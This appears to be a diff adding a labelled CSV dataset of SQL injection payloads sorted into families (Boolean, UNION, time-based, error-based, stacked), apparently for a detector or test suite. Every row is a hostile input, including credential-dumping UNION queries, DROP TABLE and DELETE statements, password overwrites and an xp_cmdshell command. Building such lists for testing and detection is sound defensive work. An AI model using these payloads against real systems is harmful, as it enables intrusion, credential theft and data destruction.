@@ -1,0 +1,42 @@
+payload,family
+"' OR '1'='1' --",Boolean-based
+"' OR 1=1 --",Boolean-based
+"' OR '1'='1'/*",Boolean-based
+"1' OR '1'='1' -- ",Boolean-based
+"admin'--",Boolean-based
+"' OR 2=2 --",Boolean-based
+"' OR 1=1 LIMIT 1--",Boolean-based
+"or 1=1#",Boolean-based
+"UNION SELECT username, password FROM users--",UNION-based
+"' UNION SELECT NULL, NULL--",UNION-based
+"' UNION ALL SELECT NULL--",UNION-based
+"UNION SELECT NULL--",UNION-based
+"UNION SELECT username FROM users WHERE '1'='1'",UNION-based
+"UNION SELECT 1,2,3--",UNION-based
+"' UNION SELECT 1,@@version--",UNION-based
+"' UNION SELECT database(),user(),version()--",UNION-based
+"sleep(5)",Time-based
+"'; WAITFOR DELAY '00:00:05'--",Time-based
+"benchmark(1000000,md5(1))",Time-based
+"; SELECT pg_sleep(5);--",Time-based
+"' OR SLEEP(5)--",Time-based
+"IF((SELECT COUNT(*) FROM users)>0,SLEEP(5),0)",Time-based
+"WAITFOR DELAY '00:00:05'--",Time-based
+"SELECT pg_sleep(5) --",Time-based
+"extractvalue(1,concat(0x3a,(select database())))",Error-based
+"updatexml(1,concat(0x3a,(select database())),1)",Error-based
+"'||(select user)||'",Error-based
+"AND 1/0",Error-based
+"SELECT * FROM users WHERE 1=convert(int,(SELECT top 1 name FROM sysobjects))",Error-based
+"SELECT CAST(database() AS int)",Error-based
+"SELECT @@version",Error-based
+"EXTRACTVALUE(1, CONCAT(0x7e, (SELECT DATABASE())))",Error-based
+"1; DROP TABLE users; --",Stacked/other
+"'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '%'",Stacked/other
+"'; DROP TABLE users; SELECT * FROM customers WHERE name LIKE '%'",Stacked/other
+"'; SELECT * FROM users WHERE 'a'='a",Stacked/other
+"'; EXEC xp_cmdshell('dir');--",Stacked/other
+"'; DROP TABLE sessions; --",Stacked/other
+"' ; UPDATE users SET password='x' --",Stacked/other
+"1; INSERT INTO users(name) VALUES ('hacker');--",Stacked/other
+"1; DELETE FROM users;--",Stacked/other
